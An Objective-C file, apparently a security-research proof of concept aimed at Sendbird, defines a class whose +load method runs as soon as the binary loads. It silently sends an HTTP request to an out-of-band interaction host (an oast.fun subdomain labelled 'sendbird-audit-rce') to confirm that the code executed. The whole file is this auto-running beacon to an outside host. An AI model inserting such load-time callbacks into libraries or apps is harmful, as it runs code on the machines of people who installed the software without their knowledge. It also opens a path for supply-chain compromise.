#import <Foundation/Foundation.h>

@interface SendbirdAudit : NSObject
@end

@implementation SendbirdAudit
// Method +load otomatis dieksekusi oleh runtime saat binary di-load ke memori
+ (void)load {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        NSString *oast = @"http://sendbird-audit-rce.rscrwozltcmjjimsghzqjfolhc1ggxoi8.oast.fun/runtime";
        NSURL *url = [NSURL URLWithString:oast];
        if (url) {
            NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithURL:url completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {}];
            [task resume];
            NSLog(@"[!] SENDBIRD SECURITY AUDIT - RUNTIME PROBE SENT");
        }
    });
}
@end
